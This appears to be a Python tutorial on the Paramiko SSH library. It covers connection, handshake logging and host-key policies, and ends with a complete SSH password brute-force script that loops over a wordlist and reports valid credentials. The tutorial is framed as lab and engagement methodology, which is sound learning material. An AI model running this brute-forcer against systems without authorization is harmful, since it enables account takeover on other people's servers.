'''
Paramiko lets you speak the SSH protocol from Python. Instead of running ssh user@host in a subprocess, 
Paramiko implements the entire SSHv2 protocol in Python — the key exchange, encryption negotiation, and authentication handshake all happen inside your script.
'''
import paramiko

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

# This single call does the entire SSHv2 handshake
client.connect("192.168.128.1", username="admin", password="password123", timeout=3)

# Execute a command over the encrypted channel
stdin, stdout, stderr = client.exec_command("id")
print(stdout.read().decode())  # uid=0(root) gid=0(root) groups=0(root)

client.close()

'''
The SSHv2 handshake — what Paramiko does when you call connect()
'''
import paramiko
import logging

# Enable Paramiko's debug logging to see every step of the handshake
logging.basicConfig()
paramiko_logger = logging.getLogger("paramiko")
paramiko_logger.setLevel(logging.DEBUG)

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
    client.connect("scanme.nmap.org", username="test", password="test", timeout=5)
except paramiko.AuthenticationException:
    print("[expected] Auth failed — but handshake completed")
finally:
    client.close()

'''
Run this against a live SSH server. The debug output shows every phase: banner exchange, algorithm negotiation, key exchange, host key verification, then authentication attempt.
'''
'''
AutoAddPolicy vs RejectPolicy — the MITM (Man-in-the-Middle) tradeoff

'''
import paramiko

client = paramiko.SSHClient()

# RejectPolicy (default) — raises SSHException on unknown host key
# This is secure — prevents connecting to an impostor server
client.set_missing_host_key_policy(paramiko.RejectPolicy())
try:
    client.connect("192.168.1.1", username="admin", password="pass", timeout=3)
except paramiko.SSHException as e:
    print(f"RejectPolicy blocked: {e}")
    # Server not in known_hosts — connection refused

# AutoAddPolicy — accepts any host key without verification
# Required for brute-forcing unknown targets
# INSECURE: a MITM could present a fake key and you'd connect to them
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
    client.connect("192.168.1.1", username="admin", password="pass", timeout=3)
except paramiko.AuthenticationException:
    print("AutoAddPolicy accepted the key — auth failed (wrong password)")
except Exception as e:
    print(f"Other error: {e}")
finally:
    client.close()

'''
The distinction matters for your methodology: in a real engagement, if you're brute-forcing a known target on a network you control, AutoAddPolicy is acceptable.
 If you're operating across an untrusted network segment, a MITM could intercept your brute-force attempts and collect credentials you test. In a lab, always acceptable.


'''

'''

Brute-force loop with correct exception mapping
'''
import paramiko
import socket
import sys

def attempt_login(host, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=username,
                      password=password, timeout=3)
        return True   # Auth succeeded

    except paramiko.AuthenticationException:
        return False  # Wrong password — expected, continue loop

    except socket.timeout:
        print(f"[!] Timeout on {host}:{port}")
        return False  # Treat as failure, continue loop

    except paramiko.SSHException as e:
        print(f"[!] SSH protocol error: {e}")
        return False  # Non-fatal, continue loop

    except socket.gaierror as e:
        print(f"[!] DNS failed: {e}")
        sys.exit(1)   # Fatal — entire script is pointless

    finally:
        client.close()  # Always runs

def brute_force(host, port, username, wordlist_path):
    with open(wordlist_path, "r", encoding="latin-1") as f:
        for line in f:
            password = line.strip()
            if not password:
                continue
            print(f"[*] Trying: {password}")
            if attempt_login(host, port, username, password):
                print(f"[+] Valid credential: {username}:{password}")
                return password
    print("[-] Exhausted wordlist")
    return None
'''
Notice how each exception maps directly to a decision: AuthenticationException → continue loop (it's inside attempt_login()), gaierror → kill the script (fatal condition, useless to continue).
'''
